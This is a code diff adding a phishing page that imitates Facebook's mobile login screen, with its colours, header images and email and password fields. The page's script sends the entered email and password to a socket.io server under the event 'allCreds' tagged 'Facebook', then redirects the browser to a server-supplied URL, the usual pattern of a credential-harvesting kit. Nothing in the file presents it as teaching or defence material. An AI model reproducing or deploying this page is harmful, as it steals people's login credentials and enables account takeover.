@@ -1,0 +1,122 @@
+<html>
+  <head>
+      <script src="/socket.io/socket.io.js"></script>
+      <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  </head>
+  <div id="main-header" class="main-header"></div>
+  <div id="sub-header" class="sub-header"></div>
+  <div id="main-content" class="main-content">
+    <div id="form-container" class="form-container">
+        <center>
+            <input id="email" class="text-box1" type="text" placeholder="Email or Phone">
+            <input id="password" class="text-box2" type="password" placeholder="Password">
+            <input id="button" class="submit-button" type="submit" onclick="submit()" value="Log In">
+        </center>
+    </div>
+  </div>
+  <div id="footer" class="footer"></div>
+</html>
+<style>
+  .main-header{
+    position:absolute;
+    top:0px;
+    right:0px;
+    left:0px;
+    height:44px;
+    background:#4267B2;
+    background-image:url('header.png');
+    background-size:cover;
+  }
+  .main-header p{
+    color:white;
+    font-size:20px;
+    font-family: helvetica;
+  }
+  .sub-header{
+    position: absolute;
+    top:44px;
+    right:0px;
+    left:0px;
+    height:48px;
+    background-image:url("getOnAndroid.png");
+    background-size:cover;
+  }
+  .main-content{
+    position: absolute;
+    top:88px;
+    right:0px;
+    left:0px;
+    background:#ECEFF5;
+    height:294px;
+  }
+.form-container{
+  position:absolute;
+  top:20px;
+}
+.text-box1{
+  background:#FFFFFF;
+  border-radius:2px;
+  border-top: solid 1px #DBDEE4;
+  border-right: solid 1px #DBDEE4;
+  border-left: solid 1px #DBDEE4;
+  border-bottom:none;
+  height:43px;
+  width:328px;
+  padding-left:10px;
+}
+.text-box2{
+  background:#FFFFFF;
+  border-radius:2px;
+  border-top: solid 1px #DBDEE4;
+  border-bottom: solid 1px #DBDEE4;
+  border-right: solid 1px #DBDEE4;
+  border-left: solid 1px #DBDEE4;
+  height:43px;
+  width:328px;
+  padding-left:10px;
+}
+.submit-button{
+  margin-top:10px;
+  width:328px; 
+  height:36px;
+  border-radius:3px;
+  background:#3578E5;
+  color:white;
+  border:none;
+  font-weight:bold;
+}
+.footer{
+  position:absolute;
+  bottom:0px;
+  width:100%;
+  height:200px;
+  background-image: url("footer.png");
+  background-size:cover;
+}
+</style>
+    <script>
+        var socket = io.connect();
+        socket.on('sendToEnd', function(end){
+            console.log("its all over")
+            window.location = end
+          })
+        
+                function submit(){
+                  if ($('#email').val().length <= 5){
+                  console.log("small")
+                  }else{
+                    var username = $('#email').val();
+                    var from = "Facebook"
+                    socket.emit('allCreds',from,$('#email').val(), $('#password').val());
+                  }
+                }
+                $("#password").keyup(function(event) {
+                  if (event.keyCode == 13) {
+                   $("#button").click();
+                   console.log("clicked")
+                  }
+          });
+        
+        
+              </script>
